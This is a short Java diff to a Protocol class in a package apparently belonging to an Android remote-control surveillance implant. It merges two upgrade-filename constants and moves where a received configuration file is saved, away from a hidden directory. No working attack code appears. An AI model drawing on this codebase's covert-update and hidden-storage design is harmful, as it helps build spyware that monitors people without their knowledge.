@@ -32,8 +32,7 @@ import com.ht.RCSAndroidGUI.utils.DateTime;
 import com.ht.RCSAndroidGUI.utils.WChar;
 
 public abstract class Protocol {
-	public static final String UPGRADE_FILENAME_0 = "core-0-update";
-	public static final String UPGRADE_FILENAME_1 = "core-1-update";
+	public static final String UPGRADE_FILENAME = "core-update";
 
 	// #ifdef DEBUG
 	private static Debug debug = new Debug("Protocol");
@@ -54,7 +53,7 @@ public abstract class Protocol {
 
 	public synchronized static boolean saveNewConf(byte[] conf, int offset)
 			throws CommandException {
-		AutoFile file = new AutoFile(Path.hidden() + Path.CONF_DIR
+		AutoFile file = new AutoFile(Path.conf()
 				+ Configuration.NEW_CONF);
 
 		if (file.write(conf, offset)) {
